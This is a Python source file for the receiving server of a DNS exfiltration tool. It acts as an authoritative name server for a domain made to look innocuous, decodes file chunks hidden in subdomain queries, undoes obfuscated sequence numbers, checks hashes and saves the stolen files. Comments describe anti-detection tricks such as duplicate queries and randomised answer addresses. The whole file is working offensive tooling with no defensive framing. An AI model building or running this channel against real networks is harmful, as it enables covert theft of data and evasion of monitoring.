#!/usr/bin/env python3
"""DNS Exfiltration - Authoritative DNS Server (Receiver)

Runs as an authoritative DNS server for the exfiltration domain.
Extracts encoded data from incoming DNS subdomain queries,
responds with valid DNS answers, and reassembles the exfiltrated file.

Setup:
    1. Register a domain (e.g., analytics-cdn.example.com)
    2. Set NS records to point to this server's IP
    3. Run: sudo python3 dns_server.py

Query format:
    <data_labels>.<session_id>.<seq_hex>.<base_domain>
    Metadata:  m<hash_labels>.<session_id>.0000.<base_domain>
"""

import hashlib
import os
import random
import sys
import time

from scapy.all import (
    DNS, DNSQR, DNSRR,
    IP, UDP,
    sniff, send,
)

from config import (
    BASE_DOMAIN,
    DNS_PORT,
    ENCODING_STRATEGY,
    HASH_ALGORITHM,
    METADATA_PREFIX,
    OUTPUT_DIR,
    RESPONSE_IP_POOL,
    RESPONSE_TTL,
    SEQUENCE_PRIME,
    SEQUENCE_SEED,
    SESSION_ID_LENGTH,
)
from encoding import decode_hex_split, decode_wordlist


class Session:
    """Tracks an active file transfer session."""

    def __init__(self, session_id):
        self.session_id = session_id
        self.chunk_count = None
        self.original_hash = None
        self.chunks = {}
        self.created_at = time.time()

    def is_complete(self):
        if self.chunk_count is None:
            return False
        return len(self.chunks) >= self.chunk_count

    def reassemble(self):
        """Reassemble chunks in correct order using inverse permutation."""
        if not self.is_complete():
            return None

        # Reverse the sequence obfuscation
        data = b""
        for orig_seq in range(1, self.chunk_count + 1):
            # The client sent with obfuscated seq numbers
            # obfuscated = (orig * PRIME + SEED) % total
            obfuscated = (orig_seq * SEQUENCE_PRIME + SEQUENCE_SEED) % (self.chunk_count + 1)
            if obfuscated == 0:
                obfuscated = orig_seq  # avoid collision with metadata seq
            if obfuscated in self.chunks:
                data += self.chunks[obfuscated]
            else:
                print(f"  Missing chunk with obfuscated seq {obfuscated}")
                return None
        return data


class DNSExfilServer:
    """Authoritative DNS server that extracts exfiltrated data."""

    def __init__(self):
        self.sessions = {}
        os.makedirs(OUTPUT_DIR, exist_ok=True)

    def decode_labels(self, labels):
        """Decode data labels using the configured strategy."""
        if ENCODING_STRATEGY == "hex_split":
            return decode_hex_split(labels)
        elif ENCODING_STRATEGY == "wordlist":
            return decode_wordlist(labels)
        else:
            raise ValueError(f"Unknown encoding strategy: {ENCODING_STRATEGY}")

    def parse_query(self, qname):
        """Parse a DNS query name into components.

        Format: <data_labels>.<session_id>.<seq_hex>.<base_domain>

        Returns: (data_labels, session_id, sequence_num, is_metadata)
        """
        # Remove trailing dot
        if qname.endswith("."):
            qname = qname[:-1]

        # Strip base domain
        if not qname.endswith(BASE_DOMAIN):
            return None

        prefix = qname[:-(len(BASE_DOMAIN) + 1)]  # +1 for the dot
        parts = prefix.split(".")

        if len(parts) < 3:
            return None

        # Last part before base domain = seq (hex)
        seq_hex = parts[-1]
        # Second to last = session ID
        session_id = parts[-2]
        # Everything before = data labels
        data_labels = parts[:-2]

        try:
            seq_num = int(seq_hex, 16)
        except ValueError:
            return None

        # Check if metadata (first data label starts with metadata prefix)
        is_metadata = False
        if data_labels and data_labels[0].startswith(METADATA_PREFIX):
            is_metadata = True
            # Strip the metadata prefix from first label
            data_labels[0] = data_labels[0][len(METADATA_PREFIX):]

        return data_labels, session_id, seq_num, is_metadata

    def build_response(self, pkt):
        """Build a valid DNS response for the query."""
        qname = pkt[DNSQR].qname
        qtype = pkt[DNSQR].qtype
        txid = pkt[DNS].id

        src_ip = pkt[IP].src
        src_port = pkt[UDP].sport
        dst_ip = pkt[IP].dst

        rdata = random.choice(RESPONSE_IP_POOL)

        response = (
            IP(src=dst_ip, dst=src_ip)
            / UDP(sport=DNS_PORT, dport=src_port)
            / DNS(
                id=txid,
                qr=1,      # response
                aa=1,       # authoritative
                rcode=0,    # no error
                qd=DNSQR(qname=qname, qtype=qtype),
                an=DNSRR(
                    rrname=qname,
                    type="A",
                    rdata=rdata,
                    ttl=RESPONSE_TTL,
                ),
            )
        )
        return response

    def handle_metadata(self, session, data_labels):
        """Process a metadata query containing chunk count and hash."""
        try:
            raw = self.decode_labels(data_labels)
            text = raw.decode()
            # Format: chunk_count||hash
            parts = text.split("||")
            if len(parts) != 2:
                print(f"  Invalid metadata format: {text}")
                return
            session.chunk_count = int(parts[0])
            session.original_hash = parts[1]
            print(f"  Metadata: {session.chunk_count} chunks, hash={session.original_hash[:16]}...")
        except Exception as e:
            print(f"  Metadata decode error: {e}")

    def handle_data(self, session, data_labels, seq_num):
        """Process a data query containing a file chunk."""
        try:
            raw = self.decode_labels(data_labels)
            session.chunks[seq_num] = raw
        except Exception as e:
            print(f"  Data decode error (seq {seq_num}): {e}")

    def check_completion(self, session):
        """Check if session is complete and save file if so."""
        if not session.is_complete():
            received = len(session.chunks)
            total = session.chunk_count or "?"
            print(f"  Progress: {received}/{total} chunks")
            return

        print(f"  All {session.chunk_count} chunks received. Reassembling...")
        data = session.reassemble()

        if data is None:
            print("  Reassembly failed - missing chunks after permutation.")
            return

        # Verify hash
        hasher = hashlib.new(HASH_ALGORITHM)
        hasher.update(data)
        received_hash = hasher.hexdigest()

        if received_hash == session.original_hash:
            filename = os.path.join(OUTPUT_DIR, f"exfil_{session.session_id}_{int(time.time())}")
            with open(filename, "wb") as f:
                f.write(data)
            print(f"  HASH VERIFIED - File saved: {filename} ({len(data)} bytes)")
        else:
            print(f"  HASH MISMATCH!")
            print(f"    Expected: {session.original_hash}")
            print(f"    Got:      {received_hash}")

        # Clean up session
        del self.sessions[session.session_id]

    def process_packet(self, pkt):
        """Process an incoming DNS query packet."""
        if not pkt.haslayer(DNSQR):
            return

        qname = pkt[DNSQR].qname.decode()

        # Only process queries for our domain
        if not qname.rstrip(".").endswith(BASE_DOMAIN):
            return

        # Send valid DNS response
        response = self.build_response(pkt)
        send(response, verbose=False)

        # Parse query
        parsed = self.parse_query(qname)
        if parsed is None:
            return

        data_labels, session_id, seq_num, is_metadata = parsed

        # Get or create session
        if session_id not in self.sessions:
            self.sessions[session_id] = Session(session_id)
            print(f"\n[+] New session: {session_id}")

        session = self.sessions[session_id]

        if is_metadata:
            self.handle_metadata(session, data_labels)
        else:
            # Skip duplicate chunks (client sends duplicates for anti-detection)
            if seq_num not in session.chunks:
                self.handle_data(session, data_labels, seq_num)

        self.check_completion(session)

    def run(self):
        """Start the DNS server."""
        print(f"DNS Exfiltration Server")
        print(f"  Domain:   {BASE_DOMAIN}")
        print(f"  Port:     {DNS_PORT}")
        print(f"  Encoding: {ENCODING_STRATEGY}")
        print(f"  Output:   {OUTPUT_DIR}")
        print(f"  Listening...\n")

        bpf_filter = f"udp port {DNS_PORT}"

        try:
            sniff(
                filter=bpf_filter,
                prn=self.process_packet,
                store=False,
            )
        except KeyboardInterrupt:
            print("\nServer stopped.")


def main():
    if os.geteuid() != 0:
        print("Error: Root privileges required. Run with sudo.")
        sys.exit(1)

    server = DNSExfilServer()
    server.run()


if __name__ == "__main__":
    main()
